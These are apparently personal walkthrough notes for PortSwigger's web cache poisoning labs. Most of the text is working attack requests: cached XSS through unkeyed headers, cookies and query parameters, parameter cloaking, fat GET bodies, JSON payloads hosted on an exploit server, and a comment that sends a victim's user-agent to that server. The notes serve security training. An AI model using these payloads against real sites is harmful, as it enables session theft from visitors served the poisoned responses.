<span style="color:yellow;font-weight:700;font-size:30px">
Web cache poisoning

</span>
https://portswigger.net/web-security/web-cache-poisoning

# [Exploiting cache design flaws (7 labs)](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)

# [***1. Lab: Web cache poisoning with an unkeyed header***](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

hint:
> This lab supports the X-Forwarded-Host header.

we see that **GET /resources/labheader/js/labHeader.js HTTP/1.1** points to:**/resources/images/tracker.gif?page=post**:

```htm
document.write('<img src="/resources/images/tracker.gif?page=post">');
```

lets find the gif in proxy (remember to check the **images** box in **filter setting window**) and try to poison it:

# request 1
```
GET /?random=123 HTTP/1.1
Host: 0ae800e5030b5cc1c044696400a20002.web-security-academy.net
Cookie: session=BrC4uOqxzpKHTCqHph2yyEjNng19qHM0
X-Forwarded-Host: kraken.com
```
**response:**
```
HTTP/1.1 200 OK
..
..       
       <script type="text/javascript" src="//kraken.com/resources/js/tracking.js"></script>
```

2. try again without the cash buster: if the response includes the kraken.com adress we have auccsessfuly poisoned the cache.

3. go to exploit server and change the exploit path to fit the suffix inserted by server: **/resources/js/tracking.js** abnd at the page body we write the command: **alert(document.cookie)** and store the finished page.

final payload will be:
# request 2
```
GET /?random=123 HTTP/1.1
Host: 0ae800e5030b5cc1c044696400a20002.web-security-academy.net
Cookie: session=BrC4uOqxzpKHTCqHph2yyEjNng19qHM0
X-Forwarded-Host: exploit-0a7600df03115cb1c00969a401b100d7.exploit-server.net
```
**response:**
```
HTTP/1.1 200 OK
..
..       
       <script type="text/javascript" src="//exploit-0a7600df03115cb1c00969a401b100d7.exploit-server.net/resources/js/tracking.js"></script>
```

4. after testing without the cash buster we go to the site homepage and see the cached pop-up

# Done!

# ***2. Lab: Web cache poisoning with an unkeyed cookie***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie

to solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser. 

1. exaining homepage request :
```
GET / HTTP/1.1
Host: 0abf002b03bdda54c01a312400ff002a.web-security-academy.net
Cookie: session=Gy4WP8cRRGXVybJQ8PFsiEsIPaAdQ7k1; fehost=prod-cache-01
..
```
we discover cookie parameter reflected in the response:
```
       <script>
            data = {
                "host":"0abf002b03bdda54c01a312400ff002a.web-security-academy.net",
                "path":"/",
                "frontend":"prod-cache-01"
            }
        </script>
```
2.  observe  cache parameter:
```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

3. inserting arbitary code will reflect so lets break out of the syntax to pop alert:
```
x"};alert(1);{"
```
(remember to urlencode:)
```
x"}%3balert(1)%3b{"
```

# POP!

# ***3. Lab: Web cache poisoning with an unkeyed header***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

hint: This lab supports the X-Forwarded-Host header. 

1. lets add header to homepage request:
```
GET / HTTP/1.1
Host: 0a32008a047d5867c0428729008000e6.web-security-academy.net
X-Forwarded-Host: test
```
lets look for our test paylkoad. observe reflection:
```
       <script type="text/javascript" src="//test/resources/js/tracking.js"></script>
            <script src="/resources/labheader/js/labHeader.js">
```

2. breakout of syntax and add to X-Forwarded-Host:
```
X-Forwarded-Host: "></script><script>alert(document.cookie)</script>//
```

# POP

# ***4. Lab: Web cache poisoning with multiple headers***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

**Hint**: This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme headers.

1. while **x-forwarded-scheme** initiate redirect back to the host, the **x-forwarded-host** defines the host - so combination of both creates am open-redirection.

2. since we plan to initiate a JS command we find a resource call to poison: 
**GET /resources/js/tracking.js HTTP/1.1**. we add our exploit server adress as follows:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a6e009004682711c069848c001b00de.web-security-academy.net
Cookie: session=hFYRyS7STShDt88kwtIthh6PAiqUEkBC
X-Forwarded-Host: exploit-0a9b00410481272ac0c6845e0137009f.exploit-server.net
X-Forwarded-Scheme: http
```
3. on our exploit server we store the alert commend:

```javascript
alert(document.cookie)
```
4. we send the request when cache-age exipres and observbe the pop.

5. on the site we enter any page (since all of them are using this resource) and abserve the pop. we wait for the victim to enter the site

# POP

# ***5.Lab: Targeted web cache poisoning using an unknown header***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

A victim user will view any comments that you post. 

To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs. 

site is being sanitized by **domPurify-2.0.15.js**:
```
GET /resources/js/domPurify-2.0.15.js HTTP/1.1
```

1. we run param-miner and find **x-host** header is available. we add this header to different request and look for reflection. we find one in the requests:
```
GET /post?postId=2 HTTP/1.1
GET / HTTP/1.1
GET /post/comment/confirmation?postId=2 HTTP/1.1
..
..
x-host: test
```
response
```htm
<script type="text/javascript" src="//test/resources/js/tracking.js"></script>
```
2. we break from syntax with payload:
```
x-host: x"></script><script>alert(document.cookie)</script>
```
and test our payload in broser and get response:
```htm
<script type="text/javascript" src="//x"></script><script>alert(document.cookie)</script>/resources/js/tracking.js"></script>
```
**we get a pop!**

now we have a cached xss in the home page, but as the response header **vary: user-agent** implies - this cached-xss attack is limited to a user with the same build as described in user-agent header 

**what is user-agent - material:**
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent

```
User-Agent: <product> / <product-version> <comment>
```
Common format for web browsers:
```
User-Agent: Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>
```
example:
```
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
```

**aquiring victims user-name with comment**

3. we know user-agent is keyed so we need to figure out our victims user-agent in order for our cached-xss attack to work

exfiltrating the victims useragent: in comment we post a comment with img tag source pointing to exploit server:
```
<img src="https://exploit-0aa200c904fba887c09e034f01e200de.exploit-server.net/user-agent">
```
this is a stored xss to exfiltrate the Victim's user-agent. we check in exploit server log and we see:
```
10.0.4.168      2022-10-08 18:45:16 +0000 "GET /user-agent HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36"
```
so lets add **User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36** to our cached-xss request:
```
GET / HTTP/1.1
..
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36
x-host: x"></script><script>alert(document.cookie)</script>
```

# ***6. Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 


1. investigate with param-miner:
```
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-forwarded-host
```

1. observe in **GET / HTTP/1.1** response:
```htm
       <script>
            data = {
                "host":"0ae000ea03dd34ebc02389ed006e003a.web-security-academy.net",
                "path":"/product",
            }
        </script>
```
with link to loaction source:
```htm
                   <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
```
and a link to a javascript:
```htm
       <script type="text/javascript" src="/resources/js/geolocate.js">
```
examening the **GET /resources/js/geolocate.js HTTP/1.1** response we observe **innerHTML** element which is a possible XSS sink:
```javascript
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
       .then(r => r.json())
       .then(j => {
       ..
       let div = document.createElement("div");
       div.innerHTML = 'Free shipping to ' + j.country;
       geoLocateContent.appendChild(div)
       }
```

2. *Analayze site process:*
**GET / HTTP/1.1** request loads resource (country value) from **/resources/json/geolocate.json** and sends it to **/resources/labheader/js/labHeader.js** where the value is inserted into the **innerHTML** sink

we need to **Step 1** poison the resource so it will fetch our payload as country value **Step 2** craft the payload so it will pop and wait for the victim to visit the site

3. *craft the attack:*
**Step 1**
observe resource format:
```
initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
```
to mimic it we add **x-forwarded-host** (discovered with param-miner)to the **GET / HTTP/1.1**:
```
GET / HTTP/1.1
Host: 0ae000ea03dd34ebc02389ed006e003a.web-security-academy.net
..
x-forwarded-host: exploit-0a62000b03253456c023895e015200ef.exploit-server.net
```
and in our expoloit server we prepare a page with the same path:
```
/resources/json/geolocate.json
```
**together they form a valid address pointing to our payload**


**Step 2** 
copy the original **GET /resources/json/geolocate.json HTTP/1.1** to  exploit server
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
    "country": "United Kingdom"
}
```
add **CORS header** and tweak it to include DOM XSS payload (I had to try many untill I found event handler who wasnt being sanitized...):
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *

{
    "country": "<select autofocus onfocus=alert(document.cookie)>"
}

```
4. initiate the attack with **GET / HTTP/1.1** request which will pull our payload from **exploit-server/resources/json/geolocate.json** and serve it to the innerHTML sink at **/resources/labheader/js/labHeader.js**

# POP!


# ***7. Lab: Combining web cache poisoning vulnerabilities***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities

A user visits the home page roughly once a minute and their language is set to English. 

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

# **scan with param-miner:**
```
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net:
origin
x-forwarded-host 
x-original-url
sec-websocket-version
```
#  **Test headers:**

try diferent headers with *test* value in **GET / HTTP/1.1** observe that 

**x-forwarded-host: test** yields:
```htm
       <script>
            data = {
                "host":"test",
                "path":"/",
            }
        </script>
..        
..
       <script>
              initTranslations('//' + data.host + '/resources/json/translations.json');
       </script>
```

this call for json implies a code injection point. use the **x-forwarded-host** to point to the *xploit server* and check *exploit-server-log* for a request from the victims browser. this means our chached payload fired properly. 

examin the Json call:

# **GET /resources/json/translations.json HTTP/1.1**
request to fetch the Json object that consist of the dictionary used by translating process:
```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes",
            "Description:": "Descripción:"
        }
    },
    ..
    ..
}    
```

use this format to craft a Json object in the exploit server. fill the fields as follow:

assign file name and path on the exploit server according to the suffix **initTranslations** function adds automaticly:
>initTranslations('//' + data.host + '/resources/json/translations.json')


**File:** 
/resources/json/translations.json
```

 change the Content-Type to a **application/json** and set CORS to accept from all sources **\***
```

**Head:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *
```

at the same structure as the original Json craft the weaponized Json:

**Body:**
```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "espayol",
        "translations": {
            "Home": "<img src=x onerror=alert('document.cookie');>",
            "View details": "fff",
            "Description:": "Descripn:"
        }
    }
}    
```
***sidenote**: though its faster to use the attack on "view details" key, it will also mean closing multiple POPs every time its fired...*

send a **GET / HTTP/1.1** with a **x-forwarded-host: \[exploit-server-address]** 
and see the response in a browser to confimrn the POP. press on the home link to refresh the page and confirmed another POP. confirm in Burp the request was a hit (cached response)

at this stage our payload works for Spanish page only - it doesnt work on english pages. to understand the language process mechanism change to any language and back to english. observe a cookie was generated with session and language setting. follow the **initTranslations** function that appears in the homepage response and find it in **GET /resources/js/translations.js HTTP/1.1**
<!-- 
first observe there are 2 almost identical **GET /resources/js/translations.js HTTP/1.1** requests.they are different in the following headers (and the responses are identical):
```h
Sec-Fetch-Dest: script -> empty //header defines what is the intended use of the fetched data
Sec-Fetch-Mode: no-cors -> cors //heade defines if Cross-Origin Resource Sharing is allowed  
```
we will examine the 2nd request (with CORS enabled). 
-->

the **initTranslations** function fetches the dictionary Json, parses the cookie for the the Language value and performs a translation on given situation. exminig the code reveals that translation process will fire in response**to any language key - as long as its not english**:
> **lang.toLowerCase() !== 'en'**

```javascript

function initTranslations(jsonUrl)
{
    const lang = document.cookie.split(';') // cookie parsing
//..
    const translate = (dict, el) => { // tanslating
    }
//..
    fetch(jsonUrl) //json processing
//..
            lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
        }); // the actual processing rules of translation. anything but english is being translated.
}
```
from Lab description we knw Victim uses English page - so our spanish page cached response will not work on him. we need to make an english cached response to redirect to our cached Spanish page response.
<!-- 
**GET /?localized=1 HTTP/1.1**

after further examine it seems the best injection point lies in the language change page:
```
GET /?localized=1 HTTP/1.1
Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
Cookie: lang=es
x-forwarded-host: exploit-0a6b00b80383b6cbc0a5105601d60084.exploit-server.net


```
this poisns the spanish page with our xss attack -->

# **X-Original-URL**
the param-miner also found the **X-Original-URL** which defines the *original* path (proxie wise) of a request. the header value defiends the *path* and request *Host header* is used for domain address.

using **X-Original-URL** to set the language to spanish.

```
GET / HTTP/1.1
Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
X-Original-URL: /setlang/es


```
we see in the response a problem: the headers **set-cookie** cant be used to poison the cache: 
```
Set-Cookie: lang=es; Path=/; Secure
Set-Cookie: session=0zHO1GJ3lEH7d8KNr7g1tNdiVrXR2bjB;
```
we change the / into \ and hope the server will normalize: 
```
GET / HTTP/1.1
Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
X-Original-URL: /setlang\es


```
response:
```
HTTP/1.1 302 Found
Location: /setlang/es?cb=1
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0

```
there is no set-cookie header so its good to poison

# Attack:
send both stages, one after the other and wait for the victim to load the poisoned pages

# POP!


# Exploiting cache implementation flaws  (7 labs)
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws


# ***1. Lab: Web cache poisoning via an unkeyed query string***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query

To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser. 

Hint:

    If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.
    Although you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the Param Miner extension to automatically add a cache buster header to your requests.

1. find XSS
turn **Add Dynamic Cachebuster** on in param-miner settings
find reflection in **GET /?test HTTP/1.1**:

    <link rel="canonical" href='//0a2b004503a049d7c0e6105b00170073.web-security-academy.net/?test&r61bjikry3=1'/>

test basic XSS payload:
    GET /?'><script>alert(1)</script> HTTP/1.1
    Host: 0a2b004503a049d7c0e6105b00170073.web-security-academy.net

get a POP

turn **Add Dynamic Cachebuster**  off and cache the XSS (wait to age 35 and send request couple of times. when request with XSS payload yields a hit = the payload is cached. wait for victim to POP

# POP

# ***2. Lab: Web cache poisoning via an unkeyed query parameter***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param

 To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser. 

Hint: Websites often exclude certain UTM analytics parameters from the cache key.

try (typcly exluded from cache key)**utm_content** parameter, along with basic XSS payload and syntax breaking prefix:

    GET /?utm_content='><script>alert(1)</script> HTTP/1.1
    Host: 0af8005f03fd7940c0541f1f0004006a.web-security-academy.net

# POP


# ***3. Lab: Parameter cloaking***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser. 

Hint: The website excludes a certain UTM analytics parameter

# **GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1**

    GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
    Host: 0af100c3043efb1ac0b44ca70041009f.web-security-academy.net

yields response with javascript code:

    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
    setCountryCookie({"country":"United Kingdom"});

lets upload the following payload:

    ?callback=setCountryCookie&utm_content=ignore;callback=alert(1)

 ?callback=setCountryCookie //first parameter. all normal
 &                      // fully acceptable delimiter
 utm_content=ignore   // known ignored parameter  
 ;                  // questionable delimiter
 callback=alert(1) // duplicate (unkeyed) parameter to overwrite the first (keyd) parameter

 send with repeater:
    GET /js/geolocate.js?callback=setCountryCookie&utm_content=ignore;callback=alert(1) HTTP/1.1
    Host: 0af100c3043efb1ac0b44ca70041009f.web-security-academy.net

response:

    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
    alert(1)({"country":"United Kingdom"});

# POP!


# ***4. Lab: Web cache poisoning via a fat GET request***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser. 

# **GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1**

response:
    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
    setCountryCookie({"country":"United Kingdom"});

adding the payload at the body of **fat GET**:

    GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
    Host: 0aaa00cc04d7ed87c0c810c800b60042.web-security-academy.net
    Cookie: country=[object Object]
    Content-Length: 21


    callback=alert(1)//

response:
    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
    alert(1)//({"country":"United Kingdom"});


# ***5. Lab: URL normalization***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim. 

test home page with arbitary value - observe reflection:
request:
    GET /test HTTP/1.1
    Host: 0ab30054037c3b9cc0c36d12000900c1.web-security-academy.net
    Cookie: session=3KwvQstDRID2nVcoKyTbvgNZhcQ5Ouki
    Content-Length: 0

response
    HTTP/1.1 404 Not Found
    Content-Type: text/html; charset=utf-8
    Cache-Control: max-age=10
    Age: 0
    X-Cache: miss
    Connection: close
    Content-Length: 23

    <p>Not Found: /test</p>

use reflection for XSS:
    GET /</p><script>alert(1)</script> HTTP/1.1
    Host: 0ab30054037c3b9cc0c36d12000900c1.web-security-academy.net
    Cookie: session=3KwvQstDRID2nVcoKyTbvgNZhcQ5Ouki
    Content-Length: 0

response:
    HTTP/1.1 404 Not Found
    Content-Type: text/html; charset=utf-8
    Cache-Control: max-age=10
    Age: 0
    X-Cache: miss
    Connection: close
    Content-Length: 48
    
    <p>Not Found: /</p><script>alert(1)</script></p>

test result in browser to confirm XSS POP
make sure its a miss (cached and ready to be served to victim)
wait for POP


# ***6. Lab: Cache key injection***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection

To solve the lab, combine the vulnerabilities to execute alert(1) in the victim's browser. Note that you will need to make use of the Pragma: x-get-cache-key header in order to solve this lab. 

I think it was supposed to be harder... but this payload works:
(try it first with dynamic cash buster to make sure it works and then poison cache)

    GET /?utm_content='><script>alert(1)</script>// HTTP/1.1
    Host: 0af700d2031c6da3c0664a07000100a2.web-security-academy.net
    Cookie: session=HylSBu4j0pN256iOEuD6a0mrqYhl6A2J
    Pragma: x-get-cache-key

<!-- lets try the harder Portswiggers solution for fun:
    GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
    pragma: x-get-cache-key
    Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

    GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
    Host: 0a1700ed03731ea3c0e55b1c0062002e.web-security-academy.net
    Cookie: session=u8tkkPW5TxlcoDOcfOB8KBCMXyfQRHW4; lang=en
    Content-Length: 0

it doesnt work well... TBC     -->




# ***7. Lab: Internal cache poisoning***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal

To solve the lab, poison the internal cache so that the home page executes alert(document.cookie) in the victim's browser. 

1st telltale: when Dynamic cashbuster enabled - we see that a *set-cookie* header is added to response:
    Set-Cookie: session=Y4ypG08X0NdCC42hKFMZuIh8eqgKqnqX; Secure; HttpOnly; SameSite=None
while when the dynamic CB disabled we see this only on the first (cached) response and not the following one.

observe that x-forwarded-host header yields different response when value change.




> **GET / HTTP/1.1**

       <script src=//0ae900370380c1a8c0546fd900fd008e.web-security-academy.net/js/geolocate.js?callback=loadCountry></script>


        <script type="text/javascript" src="//0ae900370380c1a8c0546fd900fd008e.web-security-academy.net/resources/js/analytics.js"></script>


> **GET /js/geolocate.js?callback=loadCountry HTTP/1.1**

    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
    loadCountry({"country":"United Kingdom"});


> **GET /analytics?id=dsCaXDLjgQfu8mr8 HTTP/1.1**



**1st POP:**

GET / HTTP/1.1
Host: 0ae900370380c1a8c0546fd900fd008e.web-security-academy.net
Cookie: session=noiXwQNM55JxNbWSwZZjLWavDqcqH9BP
x-forwarded-Host: exploit-0abc000c033ac1bcc0ac6f1501150018.exploit-server.net

2. POP:

GET / HTTP/1.1
Host: 0ae900370380c1a8c0546fd900fd008e.web-security-academy.net
x-forwarded-Host: x" onerror=alert(1)></script>//

we get a hit in server when we use:
GET / HTTP/1.1
Host: 0a87000a046c84c1c0c0c46700e20051.web-security-academy.net
x-forwarded-host: exploit-0ae800d004a88487c09dc41d016500bf.exploit-server.net

**final payload:**
GET /js/geolocate.js?callback=loadCountry&utm_contest=22&callback=alert(document.cookie)// HTTP/1.1
Host: 0a87000a046c84c1c0c0c46700e20051.web-security-academy.net
Content-Length: 0
x-forwarded-host: exploit-0ae800d004a88487c09dc41d016500bf.exploit-server.net

**exploit server**:
file:
> /js/geolocate.js
Head:> HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Body:
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8

